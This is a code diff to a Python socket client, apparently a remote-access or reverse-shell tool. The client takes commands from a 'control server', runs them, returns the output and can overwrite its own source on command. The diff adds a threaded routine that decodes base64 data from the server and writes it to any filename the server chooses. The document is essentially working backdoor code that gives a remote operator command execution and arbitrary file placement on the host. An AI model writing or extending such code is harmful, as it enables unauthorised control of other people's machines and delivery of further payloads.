@@ -4,7 +4,9 @@ import socket
 import subprocess
 import sys
 from os.path import expanduser, realpath
+from base64 import b64decode
 from time import sleep
+import threading
 
 
 class Client(object):
@@ -66,11 +68,12 @@ class Client(object):
         self.sock.send(str.encode(some_data + '~!_TERM_$~'))
         return self
 
-    def receive_data(self, echo=False):
+    def receive_data(self, echo=False, decode=True):
         """
         Receive data from the server until we get the termination string.
 
         :param echo:
+        :param decode:
         :return:
         """
 
@@ -95,7 +98,11 @@ class Client(object):
                 continue
 
             # Decode from bytes.
-            d = data.decode('utf-8')
+            if decode:
+                d = data.decode('utf-8')
+            else:
+                d = b64decode(data)
+
             total_data += d
             if echo:
                 print('Data:', d)
@@ -155,6 +162,34 @@ class Client(object):
         self._connect_to_server()
         return self
 
+    def write_file_data(self, upload_data, upload_filename):
+        """
+        Write the upload_data to the upload_filename
+
+        :param upload_data:
+        :param upload_filename:
+        :return:
+        """
+
+        print(upload_data)
+        with open(upload_filename, 'wb') as f:
+            f.write(b64decode(upload_data))
+        return
+
+    def handle_file_upload(self, upload_data, upload_filename):
+        """
+        Handle the file upload.
+
+        :param upload_data:
+        :param upload_filename:
+        :return:
+        """
+
+        self.send_data('Got file.')
+        t = threading.Thread(target=self.write_file_data, args=(upload_data, upload_filename))
+        t.start()
+        return self
+
     def main(self):
         """
         Start receiving commands.
@@ -164,6 +199,7 @@ class Client(object):
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
+            upload_filename = False
             while True:
                 data = self.receive_data()
 
@@ -211,7 +247,7 @@ class Client(object):
 
                     # Break the loop.
                     if data == 'break':
-                        self._send_output_with_cwd('')
+                        self.send_data(' ')
                         break
 
                     # Reboot self.
@@ -226,12 +262,27 @@ class Client(object):
                         sleep(1)
                         continue
 
+                    # Handle setting the file upload name.
+                    if data[:16] == 'upload_filename ':
+                        upload_filename = data[16:]
+                        self.send_data('Got filename.')
+                        continue
+
+                if data[:11] == 'upload_data':
+                    if not upload_filename:
+                        self.send_data('Requires an upload filename.  Send with `upload_filename {filename}`.')
+                        continue
+                    self.send_data('Send Data')
+                    upload_data = self.receive_data()
+                    self.handle_file_upload(upload_data, upload_filename)
+                    continue
+
                 # Update the client.py file(this file here).
                 if data[:7] == 'update ':
                     with open('client.py', 'w') as f:
                         f.write(data[7:])
                         f.close()
-                    self._send_output_with_cwd('Client updated...\n')
+                    self.send_data('Client updated...\n')
                     continue
 
                 # Handle the cd command.
@@ -251,12 +302,12 @@ class Client(object):
 
                         # Change the directory
                         os.chdir(_dir)
-                        self._send_output_with_cwd('')
+                        self.send_data('')
                         continue
                     except Exception as err_msg:
                         # If we get any errors, send em back!
                         err_msg = str(err_msg)
-                        self._send_output_with_cwd(err_msg + "\n")
+                        self.send_data(err_msg + "\n")
                         continue
 
                 # Process the command.
@@ -274,7 +325,7 @@ class Client(object):
 
                 print('Output Str: {}'.format(output_str))
                 # Send the output back to control server.
-                self._send_output_with_cwd(output_str)
+                self.send_data(output_str)
 
 
 if __name__ == '__main__':
